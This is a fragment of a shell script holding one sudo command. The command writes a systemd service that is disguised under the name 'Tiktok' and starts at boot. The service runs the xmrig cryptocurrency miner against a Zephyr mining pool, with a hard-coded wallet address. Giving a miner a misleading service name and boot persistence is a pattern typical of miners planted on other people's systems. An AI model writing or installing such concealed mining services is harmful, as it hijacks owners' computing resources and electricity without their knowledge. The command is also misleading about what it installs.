...
sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing/xmrig --donate-level 1 -o de.zephyr.herominers.com:1123 -u ZEPHYR3eByAcNNfyKzfAHtJaoTrJ3nnfn4qZSjAX4SPT14wYvNmne8jaei24JjUXpb1WrPqNgXgaVCVZr1Cy566NCdB7YL3juVa51 -p '$worker_name' -a rx/0 -k -t '$worker_thread'\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/tiktok.service'
